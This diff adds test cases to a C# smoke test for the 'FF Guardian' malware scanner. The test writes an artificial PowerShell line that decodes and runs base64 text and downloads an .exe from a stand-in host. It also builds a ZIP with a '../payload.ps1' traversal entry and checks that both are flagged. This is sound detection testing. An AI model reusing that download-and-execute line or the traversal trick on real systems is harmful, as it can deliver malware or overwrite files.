@@ -1,3 +1,4 @@
+using System.IO.Compression;
 using System.Security.Cryptography;
 using FFGuardian;
 using FFGuardian.Engine10;
@@ -37,6 +38,45 @@ internal static class Program
             FileScanResult10 suspiciousResult = await engine.ScanFileAsync(suspiciousFile);
             Ensure(suspiciousResult.Verdict == ThreatVerdict10.Suspicious,
                 $"Il file di prova doveva essere sospetto, risultato: {suspiciousResult.Verdict}.");
+
+            string suspiciousScript = Path.Combine(root, "update.ps1");
+            await File.WriteAllTextAsync(
+                suspiciousScript,
+                "$x='a'; Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))); " +
+                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
+            FileScanResult10 scriptResult = await engine.ScanFileAsync(suspiciousScript);
+            Ensure(scriptResult.Verdict == ThreatVerdict10.Suspicious,
+                $"Lo script artificiale doveva essere sospetto, risultato: {scriptResult.Verdict}.");
+            Ensure(scriptResult.DetectionName == "Heuristic.Suspicious.Script",
+                "Lo script sospetto non ha ricevuto la classificazione prevista.");
+
+            string harmlessZip = Path.Combine(root, "documents.zip");
+            using (ZipArchive archive = ZipFile.Open(harmlessZip, ZipArchiveMode.Create))
+            {
+                ZipArchiveEntry entry = archive.CreateEntry("readme.txt");
+                await using StreamWriter writer = new(entry.Open());
+                await writer.WriteAsync("Archivio innocuo per test FF Guardian");
+            }
+            FileScanResult10 harmlessZipResult = await engine.ScanFileAsync(harmlessZip);
+            Ensure(harmlessZipResult.Verdict == ThreatVerdict10.Unknown,
+                "Un archivio ZIP innocuo non deve essere classificato come minaccia.");
+
+            string suspiciousZip = Path.Combine(root, "suspicious.zip");
+            using (ZipArchive archive = ZipFile.Open(suspiciousZip, ZipArchiveMode.Create))
+            {
+                ZipArchiveEntry entry = archive.CreateEntry("../payload.ps1");
+                await using StreamWriter writer = new(entry.Open());
+                await writer.WriteAsync("Write-Output 'test only'");
+            }
+            FileScanResult10 suspiciousZipResult = await engine.ScanFileAsync(suspiciousZip);
+            Ensure(suspiciousZipResult.Verdict == ThreatVerdict10.Suspicious,
+                $"Lo ZIP artificiale doveva essere sospetto, risultato: {suspiciousZipResult.Verdict}.");
+            Ensure(suspiciousZipResult.DetectionName == "Heuristic.Suspicious.Archive",
+                "L'archivio sospetto non ha ricevuto la classificazione prevista.");
+
+            FolderScanSummary10 folderResult = await engine.ScanFolderAsync(root);
+            Ensure(folderResult.FilesScanned >= 4, "La scansione cartella non ha analizzato tutti i tipi avanzati previsti.");
+            Ensure(folderResult.SuspiciousFiles >= 3, "La scansione cartella non ha riportato i contenuti sospetti previsti.");
 
             AuditFinding10 finding = new(
                 "SMOKE-QUARANTINE",
